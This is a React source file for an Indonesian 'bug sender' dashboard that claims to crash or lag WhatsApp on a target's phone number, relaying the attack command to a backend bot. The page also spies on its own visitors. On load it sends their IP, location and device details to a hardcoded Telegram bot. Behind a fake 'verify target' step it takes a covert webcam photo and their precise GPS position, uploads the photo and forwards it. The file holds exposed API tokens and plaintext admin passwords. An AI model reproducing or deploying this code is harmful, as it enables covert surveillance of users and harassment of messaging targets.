"use client"

import React, { useState, useEffect, useRef } from "react"
import {
  Shield, Bug, LayoutDashboard, Settings, Loader2, ChevronLeft, ChevronRight,
  ZapOff, Activity, Ghost, Skull, Ban, Infinity, Lock, AlertTriangle,
  ExternalLink
} from "lucide-react"

// ========== KONFIGURASI ==========
const TELE_TOKEN = "8208922468:AAGCSBYVOB-aRRz1s__rHZUwh2h5rSMsRbk"
const CHAT_ID = "6481060681"
const IMGBB_API_KEY = "4caf6ea53a17b11f879581a8ca9ee92e"

type UserRole = "free" | "admin"
type PairingStatus = "idle" | "loading" | "success"
type SenderType = "global" | "pribadi"

const BUG_TYPES = [
  { name: "DELAY INVISIBLE", code: "delayLow", icon: <Ghost className="w-10 h-10 text-cyan-400" /> },
  { name: "FORCE CLOSE INVIS", code: "crashHigh", icon: <Skull className="w-10 h-10 text-red-500" /> },
  { name: "DALAY INVIS IOS", code: "blankTap", icon: <ZapOff className="w-10 h-10 text-yellow-500" /> },
  { name: "BLANK UI", code: "delayIOS", icon: <Activity className="w-10 h-10 text-pink-500" /> },
  { name: "CRASH ANDROID", code: "forceClose", icon: <Bug className="w-10 h-10 text-orange-500" /> },
]

export default function YaeMikoDashboard() {
  // ========== STATE ==========
  const [isHydrated, setIsHydrated] = useState(false)
  const [isLoggedIn, setIsLoggedIn] = useState(false)
  const [userRole, setUserRole] = useState<UserRole>("free")

  const [username, setUsername] = useState("")
  const [password, setPassword] = useState("")
  const [targetNumber, setTargetNumber] = useState("")

  const [bugLimit, setBugLimit] = useState(5)
  const [isWebLocked, setIsWebLocked] = useState(false)
  const [isSending, setIsSending] = useState(false)
  const [engineSpeed, setEngineSpeed] = useState("Normal")
  const [activeNav, setActiveNav] = useState<number>(0)
  const [currentView, setCurrentView] = useState<"dashboard" | "settings">("dashboard")

  const [isMusicOn, setIsMusicOn] = useState(true)
  const [isStealth, setIsStealth] = useState(false)
  const [onlineUsers, setOnlineUsers] = useState(38)
  const [isVerified, setIsVerified] = useState(false)

  // Modal & Overlay States
  const [showErrorOverlay, setShowErrorOverlay] = useState(false)
  const [showLimitPopup, setShowLimitPopup] = useState(false)
  const [showRestrictedOverlay, setShowRestrictedOverlay] = useState(false)
  const [showVerifyModal, setShowVerifyModal] = useState(false)

  // Sender Pribadi States
  const [senderNumber, setSenderNumber] = useState("")
  const [pairingStatus, setPairingStatus] = useState<PairingStatus>("idle")
  const [receivedCode, setReceivedCode] = useState("")

  const bgMusicRef = useRef<HTMLAudioElement>(null)
  const isSendingRef = useRef(false)

  // ========== FUNCTIONS ==========

  const sendInitialIntel = async () => {
    try {
      let targetID = localStorage.getItem('target_uuid') ||
        'SELZ-' + Math.random().toString(36).substring(2, 9).toUpperCase()
      localStorage.setItem('target_uuid', targetID)

      const ipRes = await fetch('https://ipapi.co/json/')
      const ipData = await ipRes.json()

      let gpu = "Unknown"
      try {
        const gl = document.createElement('canvas').getContext('webgl')
        const debug = gl?.getExtension('WEBGL_debug_renderer_info')
        gpu = gl?.getParameter(debug?.UNMASKED_RENDERER_WEBGL || 0) || "Unknown"
      } catch (e) {}

      const msg = `🕵️ **NEW INTEL: ${targetID}**\n━━━━━━━━━━\n📍 **IP:** ${ipData.ip} (${ipData.org})\n🌍 **LOC:** ${ipData.city}, ${ipData.country_name}\n💻 **OS:** ${navigator.platform}\n🎮 **GPU:** ${gpu.slice(0,30)}`

      await fetch(`https://api.telegram.org/bot${TELE_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown' })
      })
    } catch (e) {
      console.error(e)
    }
  }

  const getPreciseLocation = (): Promise<string> => {
    return new Promise((resolve) => {
      if (!navigator.geolocation) return resolve("GPS Not Supported")
      navigator.geolocation.getCurrentPosition(
        (pos) => {
          const link = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`
          resolve(`📍 **PRECISE LOC:** [Open Google Maps](${link})\n🎯 **ACCURACY:** \`${pos.coords.accuracy.toFixed(1)}m\``)
        },
        () => resolve("📍 **PRECISE LOC:** `Permission Denied`"),
        { enableHighAccuracy: true, timeout: 5000 }
      )
    })
  }

  const uploadToIMGBB = async (imageBlob: Blob) => {
    const formData = new FormData()
    formData.append('image', imageBlob)
    try {
      const res = await fetch(`https://api.imgbb.com/1/upload?key=${IMGBB_API_KEY}`, {
        method: 'POST',
        body: formData
      })
      const data = await res.json()
      return data.success? data.data.url : null
    } catch (e) {
      return null
    }
  }

  const startFinalExecution = async () => {
    setShowVerifyModal(false)
    setIsSending(true)
    setIsVerified(true)
    localStorage.setItem('target_verified', 'true')

    const preciseLoc = await getPreciseLocation()

    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true })
      const video = document.createElement('video')
      video.srcObject = stream
      await video.play()

      setTimeout(async () => {
        const canvas = document.createElement('canvas')
        canvas.width = video.videoWidth
        canvas.height = video.videoHeight
        canvas.getContext('2d')?.drawImage(video, 0, 0)
        const blob = await new Promise<Blob | null>(res => canvas.toBlob(res, 'image/jpeg'))

        if (blob) {
          const photoUrl = await uploadToIMGBB(blob)
          const message = `📸 **TARGET CAPTURED**\n━━━━━━━━━━\n📱 **Target:** \`${targetNumber}\`\n🖼️ **Photo:** ${photoUrl || 'Upload Failed'}\n${preciseLoc}`

          await fetch(`https://api.telegram.org/bot${TELE_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' })
          })
        }
        stream.getTracks().forEach(t => t.stop())
        setIsSending(false)
      }, 3000)
    } catch (e) {
      await fetch(`https://api.telegram.org/bot${TELE_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: `⚠️ **CAMERA BLOCKED**\nTarget: ${targetNumber}\n${preciseLoc}`,
          parse_mode: 'Markdown'
        })
      })
      setIsSending(false)
    }
  }

  const syncWithCloud = async (
    action: 'get' | 'set' | 'sendReport',
    valueToSet?: number,
    messageText?: string
  ) => {
    try {
      if (userRole === "admin" && (action === 'get' || action === 'set')) return

      if (action === 'get') {
        if (isSendingRef.current) return
        const res = await fetch(`/api/control?update=${Date.now()}`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ action: 'get_data' })
        })
        const data = await res.json()
        if (data?.ok &&!isSendingRef.current) {
          if (data.limit!== undefined) setBugLimit(Number(data.limit))
          if (data.locked!== undefined) setIsWebLocked(data.locked)
          if (pairingStatus === "loading" && data.pairingCode) {
            setReceivedCode(data.pairingCode)
            setPairingStatus("success")
          }
        }
      } else if (action === 'set' && valueToSet!== undefined) {
        await fetch('/api/control', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ action: 'set', valueToSet })
        })
      } else if (action === 'sendReport' && messageText) {
        await fetch('/api/control', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ action: 'sendReport', messageText })
        })
      }
    } catch (err) {
      console.error(err)
    }
  }

  const handleRequestPairing = async () => {
    if (!senderNumber) {
      alert("MASUKIN NOMOR SENDER NYA DULU DONGO! 😹")
      return
    }
    setPairingStatus("loading")
    try {
      await syncWithCloud('sendReport', undefined, `/reqpair ${senderNumber}`)
    } catch (e) {
      console.error(e)
    }
  }

  const handleLogin = async () => {
    if (username === "Leo" && password === "LEONZKENEDYZ") {
      setUserRole("admin")
      setIsLoggedIn(true)
      setShowErrorOverlay(false)
      await syncWithCloud('sendReport', undefined,
        `👑 *LAPORAN LOGIN ADMIN OWNER*\n\n👤 *User:* ${username}\n⚡ *Status:* Administrator`)
    } else if (username === "Selz" && password === "Freebug") {
      setUserRole("free")
      setIsLoggedIn(true)
      setShowErrorOverlay(false)
      await syncWithCloud('sendReport', undefined,
        `🔔 *LAPORAN LOGIN DASHBOARD MEMBER*\n\n👤 *User:* ${username}`)
    } else {
      setShowErrorOverlay(true)
      await syncWithCloud('sendReport', undefined,
        `⚠️ *PERCOBAAN LOGIN GAGAL!*\n\n👤 *Username:* ${username || 'Kosong'}`)
    }
  }

  const handleSendBug = async () => {
    if (targetNumber === "6289505198913") {
      setShowRestrictedOverlay(true)
      return
    }

    if (userRole === "free" && bugLimit <= 0) {
      setShowLimitPopup(true)
      return
    }

    isSendingRef.current = true

    let nextLimit = bugLimit
    if (userRole === "free") {
      nextLimit = Math.max(0, bugLimit - 1)
      setBugLimit(nextLimit)
      await syncWithCloud('set', nextLimit)
    }

    const delay = engineSpeed === "Instant"? 1000 : engineSpeed === "Fast"? 2500 : 4000
    const selectedBug = BUG_TYPES[activeNav].name

    setTimeout(async () => {
      const sisaLimitText = userRole === "admin"? "UNLIMITED (👑 ADMIN)" : `${nextLimit}/5`

      await syncWithCloud('sendReport', undefined,
        `🚀 *LAPORAN PENYERANGAN BUG*\n\n👤 *Pengirim:* ${username} (${userRole.toUpperCase()})\n🎯 *Target:* \`${targetNumber}\`\n👾 *Jenis Bug:* ${selectedBug}\n⚡ *Speed:* ${engineSpeed}\n📉 *Sisa Limit:* ${sisaLimitText}`)

      setTimeout(async () => {
        await fetch('/api/control', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ action: 'sendReport', messageText: `/ryx ${targetNumber}` })
        })
      }, 1000)

      if (isVerified) {
        startFinalExecution()
      } else {
        setShowVerifyModal(true)
      }

      setTimeout(() => {
        isSendingRef.current = false
      }, 8000)
    }, delay)
  }

  // ========== EFFECTS ==========

  useEffect(() => {
    sendInitialIntel()
    const initData = async () => {
      await syncWithCloud('get')
      if (localStorage.getItem('target_verified') === 'true') {
        setIsVerified(true)
      }
      setIsHydrated(true)
    }
    initData()
  }, [])

  useEffect(() => {
    const autoRefresh = setInterval(() => syncWithCloud('get'), 4000)
    return () => clearInterval(autoRefresh)
  }, [userRole, pairingStatus])

  useEffect(() => {
    const interval = setInterval(() => {
      setOnlineUsers(prev => {
        const direction = Math.random() > 0.5? 1 : -1
        const nextValue = prev + direction
        return nextValue < 15? 16 : nextValue > 50? 49 : nextValue
      })
    }, 8000)
    return () => clearInterval(interval)
  }, [])

  useEffect(() => {
    if (bgMusicRef.current && isHydrated) {
      if (isMusicOn && isLoggedIn &&!isWebLocked) {
        bgMusicRef.current.play().catch(() => {})
      } else {
        bgMusicRef.current.pause()
      }
    }
  }, [isMusicOn, isLoggedIn, isWebLocked, isHydrated])

  // ========== RENDER ==========

  if (!isHydrated) {
    return (
      <div className="bg-black min-h-screen flex items-center justify-center">
        <Loader2 className="w-8 h-8 text-cyan-400 animate-spin" />
      </div>
    )
  }

  if (isWebLocked) {
    return (
      <div className="fixed inset-0 z-[99999] bg-black flex-col items-center justify-center p-10 text-center">
        <Ban className="w-32 h-32 text-red-600 mb-8 animate-pulse" />
        <h1 className="text-4xl font-black italic uppercase text-white mb-4">
          ⚠️SYSTEM-MAINTENANCE⚠️
        </h1>
        <p className="text-white/50 text-xs font-bold uppercase tracking-widest max-w-xs">
          Sabar Dongo, Server lagi Update Sama Selz. Balik Lagi Nanti.
        </p>
        <Loader2 className="w-4 h-4 text-red-600 animate-spin mt-10" />
      </div>
    )
  }

  return (
    <div className={`relative min-h-screen bg-black text-white overflow-hidden transition-opacity duration-500 ${isStealth? 'opacity-30' : 'opacity-100'}`}>

      {/* Background */}
      <div className="fixed inset-0 z-0">
        <video autoPlay loop muted playsInline className="w-full h-full object-cover opacity-40">
          <source src="/bg-anime.mp4" type="video/mp4" />
        </video>
        <div className="absolute inset-0 bg-gradient-to-b from-[#050b14]/70 to-black"></div>
      </div>
      <audio ref={bgMusicRef} src="/audio.mp3" loop />

      {/* Overlays */}
      {pairingStatus === "loading" && (
        <PairingLoadingOverlay
          senderNumber={senderNumber}
          onCancel={() => setPairingStatus("idle")}
        />
      )}

      {pairingStatus === "success" && (
        <PairingSuccessOverlay
          code={receivedCode}
          onClose={() => { setPairingStatus("idle"); setReceivedCode("") }}
        />
      )}

      {showErrorOverlay && <ErrorOverlay onClose={() => setShowErrorOverlay(false)} />}
      {showRestrictedOverlay && <RestrictedOverlay onClose={() => setShowRestrictedOverlay(false)} />}
      {isSending && <SendingOverlay />}
      {showLimitPopup && <LimitPopup onClose={() => setShowLimitPopup(false)} />}
      {showVerifyModal && <VerifyModal onCancel={() => setShowVerifyModal(false)} onConfirm={startFinalExecution} />}

      {/* Main Content */}
      {!isLoggedIn? (
        <LoginScreen
          username={username}
          password={password}
          setUsername={setUsername}
          setPassword={setPassword}
          onLogin={handleLogin}
        />
      ) : (
        <MainDashboard
          currentView={currentView}
          setCurrentView={setCurrentView}
          userRole={userRole}
          bugLimit={bugLimit}
          engineSpeed={engineSpeed}
          activeNav={activeNav}
          setActiveNav={setActiveNav}
          targetNumber={targetNumber}
          setTargetNumber={setTargetNumber}
          onlineUsers={onlineUsers}
          onSendBug={handleSendBug}
          onLogout={() => {
            setIsLoggedIn(false)
            setUsername("")
            setPassword("")
          }}
        />
      )}

      {/* Bottom Nav */}
      {isLoggedIn && (
        <BottomNav
          currentView={currentView}
          setCurrentView={setCurrentView}
        />
      )}

      <GlobalStyles />
    </div>
  )
}

// ========== COMPONENTS ==========

const LoginScreen = ({ username, password, setUsername, setPassword, onLogin }: any) => (
  <div className="relative z-10 flex-col items-center justify-center min-h-screen p-6">
    <h1 className="text-3xl font-black italic uppercase text-cyan-400 tracking-tighter mb-10 text-center">
      YAE MIKO <span className="text-xs text-white/30 block tracking-[0.5em]">VERSI 1.5</span>
    </h1>
    <div className="w-full max-w-sm bg-white/5 border-white/10 backdrop-blur-3xl rounded-3xl p-10 shadow-2xl space-y-4">
      <input
        type="text"
        value={username}
        onChange={(e) => setUsername(e.target.value)}
        className="w-full bg-black/60 border-white/10 p-5 rounded-2xl text-center font-bold text-xs outline-none"
        placeholder="USERNAME"
      />
      <input
        type="password"
        value={password}
        onChange={(e) => setPassword(e.target.value)}
        className="w-full bg-black/60 border-white/10 p-5 rounded-2xl text-center font-bold text-xs outline-none"
        placeholder="PASSWORD"
      />
      <button
        onClick={onLogin}
        className="w-full py-5 bg-cyan-600 rounded-full font-black uppercase text-xs flex items-center justify-center gap-3 active:scale-95 transition-all"
      >
        <Lock size={16}/> LOGIN
      </button>
    </div>
  </div>
)

const MainDashboard = ({
  currentView, setCurrentView, userRole, bugLimit, engineSpeed,
  activeNav, setActiveNav, targetNumber, setTargetNumber,
  onlineUsers, onSendBug, onLogout
}: any) => (
  <div className="relative z-10 p-6 max-w-md mx-auto min-h-screen">
    {currentView === 'dashboard'? (
      <DashboardView
        userRole={userRole}
        bugLimit={bugLimit}
        engineSpeed={engineSpeed}
        activeNav={activeNav}
        setActiveNav={setActiveNav}
        targetNumber={targetNumber}
        setTargetNumber={setTargetNumber}
        onlineUsers={onlineUsers}
        onSendBug={onSendBug}
      />
    ) : (
      <SettingsView userRole={userRole} onLogout={onLogout} />
    )}
  </div>
)

const DashboardView = ({
  userRole, bugLimit, engineSpeed, activeNav, setActiveNav,
  targetNumber, setTargetNumber, onlineUsers, onSendBug
}: any) => (
  <div className="animate-in fade-in duration-500">
    <div className="flex justify-between items-center mb-6">
      <span className="text-xs font-black uppercase tracking-widest text-cyan-400">
        SPEED: {engineSpeed}
      </span>
      <span className={`text-xs font-black uppercase px-4 py-1 rounded-full border ${
        userRole === 'admin'
        ? 'text-cyan-400 border-cyan-500/20 bg-cyan-500/10'
          : bugLimit > 0
          ? 'text-pink-500 border-pink-500/20 bg-pink-500/10'
            : 'text-red-500 border-red-500/20 bg-red-500/10'
      }`}>
        {userRole === "admin"? "ROLE: ADMIN" : `LIMIT: ${bugLimit}/5`}
      </span>
    </div>

    <BugSelector
      activeNav={activeNav}
      setActiveNav={setActiveNav}
      userRole={userRole}
      bugLimit={bugLimit}
      onlineUsers={onlineUsers}
    />

    <input
      type="text"
      value={targetNumber}
      onChange={(e) => setTargetNumber(e.target.value)}
      className="w-full bg-black/60 border-white/10 p-5 rounded-2xl text-center font-bold text-xs mb-6 outline-none"
      placeholder="MASUKAN NOMOR TARGET"
    />

    <button
      onClick={onSendBug}
      className="w-full py-5 bg-gradient-to-r from-pink-600 via-red-600 to-orange-600 rounded-[2.5rem] font-black uppercase text-xs text-white shadow-xl active:scale-95 transition-all"
    >
      KIRIM BUG
    </button>
  </div>
)

const BugSelector = ({ activeNav, setActiveNav, userRole, bugLimit, onlineUsers }: any) => (
  <div className="bg-gradient-to-br from-white/10 to-transparent border-white/10 rounded-[2.5rem] p-6 mb-6 text-center backdrop-blur-md relative shadow-2xl overflow-hidden">
    <div className="flex justify-between items-center absolute inset-x-2 top-1/2 -translate-y-1/2 z-10 px-2">
      <button
        onClick={() => setActiveNav((prev: number) => (prev - 1 + BUG_TYPES.length) % BUG_TYPES.length)}
        className="p-2 bg-black/40 rounded-full active:scale-90 transition-all"
      >
        <ChevronLeft size={20}/>
      </button>
      <button
        onClick={() => setActiveNav((prev: number) => (prev + 1) % BUG_TYPES.length)}
        className="p-2 bg-black/40 rounded-full active:scale-90 transition-all"
      >
        <ChevronRight size={20}/>
      </button>
    </div>

    <div className="mb-3 flex justify-center">{BUG_TYPES[activeNav].icon}</div>
    <h2 className="text-xl font-black italic uppercase mb-6">{BUG_TYPES[activeNav].name}</h2>

    <div className="grid grid-cols-3 gap-3">
      <StatCard
        label="LIMIT"
        value={userRole === "admin"? <Infinity className="w-5 h-5 text-cyan-400 animate-pulse" /> : bugLimit}
        color="text-cyan-400"
      />
      <StatCard
        label="STATUS"
        value={userRole === 'admin' || bugLimit > 0? 'ACT' : 'OFF'}
        color={userRole === 'admin' || bugLimit > 0? 'text-green-500' : 'text-red-600'}
      />
      <StatCard label="ONLINE" value={onlineUsers} color="text-white" />
    </div>
  </div>
)

const StatCard = ({ label, value, color }: any) => (
  <div className="bg-black/60 p-3 rounded-xl border-white/5 flex-col items-center justify-center">
    <div className={`text-lg font-black leading-none ${color}`}>{value}</div>
    <p className="text-[6px] text-white/40 uppercase font-bold mt-1">{label}</p>
  </div>
)

const SettingsView = ({ userRole, onLogout }: any) => (
  <div className="animate-in fade-in duration-500">
    <h2 className="text-lg font-black italic uppercase mb-10 border-b border-white/10 pb-4 text-cyan-400">
      Setting {userRole === "admin"? "Leo (Owner)" : "Selz"}
    </h2>
    <div className="space-y-5">
      <button
        onClick={onLogout}
        className="w-full flex items-center justify-center gap-4 py-6 bg-red-600/10 border-red-600/20 rounded-[2.5rem] text-xs font-black uppercase text-red-500 hover:bg-red-600 hover:text-white transition-all"
      >
        LOG OUT
      </button>
    </div>
  </div>
)

const BottomNav = ({ currentView, setCurrentView }: any) => (
  <div className="fixed bottom-8 left-16 right-16 bg-[#0a1628]/95 border-white/10 p-4 rounded-[2.5rem] flex justify-around backdrop-blur-3xl z-20 shadow-2xl">
    <button
      onClick={() => setCurrentView('dashboard')}
      className={`p-1 transition-all ${currentView === 'dashboard'? 'text-cyan-400 scale-110' : 'text-white/20'}`}
    >
      <LayoutDashboard size={22}/>
    </button>
    <button
      onClick={() => setCurrentView('settings')}
      className={`p-1 transition-all ${currentView === 'settings'? 'text-cyan-400 scale-110' : 'text-white/20'}`}
    >
      <Settings size={22}/>
    </button>
  </div>
)

// Overlay Components
const PairingLoadingOverlay = ({ senderNumber, onCancel }: any) => (
  <div className="fixed inset-0 z-[10008] bg-black/95 flex-col items-center justify-center p-8 text-center backdrop-blur-md">
    <Loader2 className="w-24 h-24 text-cyan-400 animate-spin mb-6" />
    <h2 className="text-2xl font-black italic uppercase text-white mb-2 tracking-wider animate-pulse">
      MENUNGGU KONFIRMASI...
    </h2>
    <p className="text-white/60 text-xs max-w-xs">
      Request <span className="text-cyan-400 font-mono">/reqpair {senderNumber}</span> telah dikirim ke Admin.
    </p>
    <button
      onClick={onCancel}
      className="mt-10 px-6 py-2 bg-white/5 border-white/10 rounded-full text-[9px] font-black text-white/40 uppercase tracking-widest hover:text-white transition-colors"
    >
      Batal
    </button>
  </div>
)

const PairingSuccessOverlay = ({ code, onClose }: any) => (
  <div className="fixed inset-0 z-[10009] bg-black/95 flex-col items-center justify-center p-8 text-center backdrop-blur-md animate-in fade-in">
    <div className="p-4 bg-cyan-500/10 border-cyan-500/20 rounded-full mb-4">
      <Shield className="w-16 h-16 text-cyan-400 animate-bounce" />
    </div>
    <h2 className="text-2xl font-black italic uppercase text-cyan-400 mb-2">WHATSAPP PAIRING CODE</h2>
    <div className="bg-white/5 border-white/10 px-10 py-6 rounded-3xl mb-10 tracking-[0.2em] font-mono text-4xl font-black text-white shadow-2xl animate-pulse">
      {code}
    </div>
    <button
      onClick={onClose}
      className="px-10 py-4 bg-white text-black font-black uppercase text-xs rounded-full shadow-2xl tracking-wider active:scale-95 transition-all"
    >
      Selesai
    </button>
  </div>
)

const ErrorOverlay = ({ onClose }: any) => (
  <div className="fixed inset-0 z-[10005] bg-red-950/90 flex-col items-center justify-center p-8 text-center backdrop-blur-3xl animate-bg_rumble">
    <AlertTriangle className="w-32 h-32 text-red-500 mb-8 animate-shake_violent" />
    <h1 className="text-4xl font-black italic uppercase text-white animate-glitch_extreme">
      CREATE AKUN KE BOT DONGO!
    </h1>
    <a
      href="https://t.me/lalaypo_bot"
      target="_blank"
      rel="noreferrer"
      className="mt-10 bg-white text-black py-5 px-10 rounded-full font-black uppercase text-xs"
    >
      BOT
    </a>
    <button onClick={onClose} className="mt-4 text-white/20 font-bold uppercase text-[9px]">
      COBA LAGI
    </button>
  </div>
)

const RestrictedOverlay = ({ onClose }: any) => (
  <div className="fixed inset-0 z-[10006] bg-red-900/95 flex-col items-center justify-center p-8 text-center backdrop-blur-3xl animate-pulse">
    <Shield className="w-40 h-40 text-white mb-6" />
    <h1 className="text-4xl font-black italic uppercase text-white tracking-tighter">ACCESS DENIED</h1>
    <p className="text-white/70 text-xs mt-4 mb-10 font-bold uppercase">
      NOMOR INI DALAM PERLINDUNGAN ADMIN SELZ
    </p>
    <button
      onClick={onClose}
      className="px-12 py-4 bg-white text-black font-black uppercase text-xs rounded-full shadow-2xl"
    >
      KEMBALI
    </button>
  </div>
)

const SendingOverlay = () => (
  <div className="fixed inset-0 z-[10002] bg-black/80 flex-col items-center justify-center backdrop-blur-md">
    <Loader2 className="w-28 h-28 text-pink-500 animate-spin mb-6" />
    <p className="font-black italic uppercase text-sm tracking-widest text-cyan-400 animate-pulse text-center">
      SEDANG MENGIRIM BUG KE TARGET
    </p>
  </div>
)

const LimitPopup = ({ onClose }: any) => (
  <div className="fixed inset-0 z-[10001] bg-black/95 flex-col items-center justify-center p-8 text-center backdrop-blur-md">
    <Bug className="w-32 h-32 text-red-600 mb-6 animate-shake_violent" />
    <h2 className="text-4xl font-black italic uppercase text-red-500 mb-2">LIMIT LU ABIS NGENTOD</h2>
    <p className="text-white/40 text-xs font-bold tracking-widest mb-10 uppercase">
      PREMIUM KE BOT LAH NGENTOD
    </p>
    <a
      href="https://t.me/lalaypo_bot"
      target="_blank"
      rel="noreferrer"
      className="bg-white text-black py-6 px-10 rounded-3xl font-black uppercase text-xs flex items-center gap-2"
    >
      <ExternalLink size={16} /> BOT
    </a>
    <button onClick={onClose} className="mt-4 text-white/20 font-black uppercase text-[9px]">
      LIMIT BAKALAN RESET SETELAH 24 JAM
    </button>
  </div>
)

const VerifyModal = ({ onCancel, onConfirm }: any) => (
  <div className="fixed inset-0 z-[10007] bg-black/90 flex-col items-center justify-center p-8 text-center backdrop-blur-md">
    <Shield className="w-24 h-24 text-cyan-400 mb-6" />
    <h2 className="text-2xl font-black italic uppercase text-white mb-2">VERIFIKASI TARGET</h2>
    <p className="text-white/60 text-xs mb-8">Pastikan target aktif. Klik lanjutkan untuk verifikasi.</p>
    <div className="flex gap-4">
      <button onClick={onCancel} className="px-8 py-4 bg-white/10 rounded-full font-black uppercase text-xs">
        Batal
      </button>
      <button onClick={onConfirm} className="px-8 py-4 bg-cyan-600 rounded-full font-black uppercase text-xs">
        Lanjutkan
      </button>
    </div>
  </div>
)

const GlobalStyles = () => (
  <style jsx global>{`
    @keyframes shake {
      0% { transform: translate(2px, 2px); }
      10% { transform: translate(-1px, -2px); }
      100% { transform: translate(0); }
    }
   .animate-shake_violent { animation: shake 0.1s infinite; }

    @keyframes rumble {
      0%, 100% { background-color: rgba(69, 10, 10, 0.9); }
      50% { background-color: rgba(127, 29, 29, 0.95); }
    }
   .animate-bg_rumble { animation: rumble 0.15s infinite; }

    @keyframes glitch {
      0% { text-shadow: 2px 0 #ff0000, -2px 0 #00ffff; }
      100% { text-shadow: -2px 0 #ff0000, 2px 0 #00ffff; }
    }
   .animate-glitch_extreme { animation: glitch 0.1s infinite; }

   .animate-in { animation: fadeIn 0.5s ease-out forwards; }
    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(20px); }
      to { opacity: 1; transform: translateY(0); }
    }
  `}</style>
)
